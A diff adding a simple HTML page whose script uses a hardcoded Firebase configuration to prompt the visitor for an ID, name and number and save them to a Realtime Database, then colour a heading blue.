@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Title</title>
+    meta
+  </head>
+  <body>
+  <h1 id="number"> 00</h1>
+  
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+  import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
+    authDomain: "freefollowers-d31af.firebaseapp.com",
+    databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
+    projectId: "freefollowers-d31af",
+    storageBucket: "freefollowers-d31af.appspot.com",
+    messagingSenderId: "807949104285",
+    appId: "1:807949104285:web:2c0238cdc7913dad279074",
+    measurementId: "G-ME1GQ5KV8H"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const Db = getDatabase(app);
+
+  // Function to write user data
+  function writeUserData(userID, name, number) {
+    set(ref(Db, 'users/' + userID), {
+      name: name,
+      number: number
+    });
+  }
+
+  // Call the function to write user data
+  var ui = prompt("Enter Your ID");
+  var nm = prompt("Enter Your Name");
+  var nb = prompt("Enter Your Number ");
+  writeUserData(ui, nm,nb);
+
+  // Change the background color of an element with ID 'number'
+  const element = document.getElementById('number');
+  if (element) {
+    element.style.background = 'blue';
+  } else {
+    console.warn("Element with ID 'number' not found.");
+  }
+</script>
+  </body>
+</html>
